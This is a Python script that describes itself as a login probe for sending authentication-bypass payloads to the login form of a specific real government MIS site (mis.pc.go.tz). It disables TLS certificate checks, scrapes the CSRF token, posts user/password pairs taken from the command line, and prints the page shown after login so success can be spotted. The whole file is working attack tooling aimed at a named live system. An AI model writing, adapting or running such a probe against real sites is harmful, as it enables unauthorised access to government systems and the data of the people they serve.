"""MIS login probe with auth-bypass payloads."""
import http.cookiejar
import re
import ssl
import sys
import urllib.parse
import urllib.request

sys.path.insert(0, ".")
import scan  # noqa: E402

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

BASE = "https://mis.pc.go.tz/pcmis.data/"
POST = BASE + "model/login/login.data.php"
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE


def opener():
    return urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()),
        urllib.request.HTTPSHandler(context=CTX))


def fetch(op, url, data=None, referer=None):
    hdrs = {"User-Agent": scan.UA}
    if referer:
        hdrs["Referer"] = referer
    if data is not None:
        hdrs["Content-Type"] = "application/x-www-form-urlencoded"
    req = urllib.request.Request(url, data=data, headers=hdrs)
    try:
        with op.open(req, timeout=20) as r:
            return r.status, r.geturl(), r.read(40000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, url, e.read(20000).decode("utf-8", "replace")
    except Exception as e:
        return 0, url, f"ERR {e}"


def text_of(html):
    b = re.sub(r"<(script|style)[^>]*>.*?</\1>", "", html, flags=re.S)
    return re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", b)).strip()


def attempt(user, pwd):
    op = opener()
    st0, _, page = fetch(op, BASE)
    if st0 == 0:
        return "down", "", page
    m = re.search(r'name="csrf_token" value="([^"]+)"', page)
    if not m:
        return "no token", "", page
    data = urllib.parse.urlencode({"id": user, "password": pwd,
                                   "action_type": "login",
                                   "csrf_token": m.group(1)}).encode()
    st, _, raw = fetch(op, POST, data=data, referer=BASE)
    st2, url2, after = fetch(op, BASE)
    return f"post={st} after={st2} url={url2}", text_of(after)[:230], raw


if __name__ == "__main__":
    for pair in sys.argv[1:]:
        u, _, p = pair.partition("|")
        meta, txt, raw = attempt(u, p)
        print(f"\n--- {u!r} / {p!r}\n   {meta}")
        print("   page:", txt)
        if "window.location" in raw:
            print("   js:", re.sub(r"\s+", " ", raw)[:120])
